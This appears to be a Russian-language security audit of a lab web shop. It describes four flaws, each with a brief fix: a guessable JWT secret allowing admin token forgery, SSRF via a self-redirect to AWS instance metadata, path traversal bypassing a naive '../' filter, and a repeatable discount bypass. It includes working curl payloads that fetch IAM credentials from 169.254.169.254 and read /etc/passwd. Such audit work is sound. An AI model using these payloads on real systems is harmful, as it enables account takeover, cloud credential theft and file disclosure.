Простой JWT-secret funkymonkey
можно даже подобрать тк он в словарях есть, таких как robots.txt

Риск: Полный захват любого аккаунта включая admin без знания пароля. Это точка входа для всех остальных атак, требующих авторизации - SSRF, path traversal, загрузка файлов          

g.user = jwt.decode(token, JWT_SECRET, algorithms=[JWT_ALGORITHM])

Фикс: генерация jwt для каждой сессий                                   
  
SSRF с обходом blocklist
цепочка через /go (см. уязв. 4): SSRF-URL указывает на сам сервер -> тот редиректит куда надо -> urllib следует за редиректом автоматически                                                             
                                                                                                                                              
Максимальный реальный риск                                                                                                                                                                                       

Читаем AWS credentials из IMDS, сканируем внутреннюю сеть, получаем доступ к микросервисам за файерволом. Через вектор В обходим любой дальнейший фиксинг blocklist                                              
                                                            
Эксплуатация                                                                                                                                                                                                     

curl -X POST https://target.com/api/admin/create_product \                                                                                                                                                       
    -H "Cookie: token=<admin_jwt>" \                        
    -H "X-CSRF-Token: <csrf>" \                                                                                                                                                                                    
    -H "Content-Type: application/json" \                                                                                                                                                                          
    -d '{                                                                                                                                                                                                          
      "description": "x",                                                                                                                                                                                          
      "price": 1,                                           
      "reviews": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"                                                                                                                               
    }'
                                                                                                                                                                                                                   
  # => {"reviews": "tourist-shop-ec2-role", ...}      // пример из поднятой мой лабы                                                                                                                                                            
   
Забираем credentials:                                                                                                                                                                                            

-d '{"description":"x","price":1,                                                                                                                                                                                
       "reviews":"http://169.254.169.254/latest/meta-data/iam/security-credentials/tourist-shop-ec2-role"}'                                                                                                        
                                                                                                                                                                                                                   
  # => {"reviews": "{\"AccessKeyId\":\"ASIA...\",\"SecretAccessKey\":\"...\",\"Token\":\"...\"}", ...}                                                                                                              

Path Traversal view,upload 

Оба эндпоинта очищают имя файла заменой ../, но делают это через str.replace - а он находит подстроку не только в начале строки: 

Эксплуатация

Чтение /etc/passwd                                                                                                                                                                 
                                                                                                                                               
curl "https://target.com/api/admin/view?file=..././..././etc/passwd" \                                                                                                                                           
    -H "Cookie: token=<admin_jwt>"        

Фикс: использовать абстрактные пути чтоб избежать pathtrev 

Bypass серверной проверки скидки
Флаг add_old_orders должен разрешать привязку старых заказов только один раз. Но сервер читает его из БД и... не проверяет перед выполнением логики                                                              

row = db.execute(                                         
      "SELECT username, discount, add_old_orders, orders_count FROM discount WHERE username = ?",                                                                                                                  
      (g.user["sub"],),
  ).fetchone()                                                                                                                                                                                                     

orders_count = row["orders_count"] + len(rows)  
  db.execute(                                                                                                                                                                                                      
      "UPDATE discount SET orders_count = ?, discount = ?, add_old_orders = 0 WHERE username = ?",
      (orders_count, discount, username,)                                                                                                                                                                          
  )                                                                                                                                                                                                                
                                                                                                                                                                                                                   
После первого вызова add_old_orders становится 0 в БД. Но при втором вызове сервер снова выполняет всю логику, просто с уже нулевым флагом - который он игнорирует. Клиентская защита в localStorage  - это самообман)             
                                                                                                                         
Максимальный реальный риск                                

Любой зарегистрированный пользователь без прав admin может накрутить себе максимальную скидку 25% через повторные вызовы с разными номерами телефонов 



различные цепочки атак в файлах chain_<idx>.py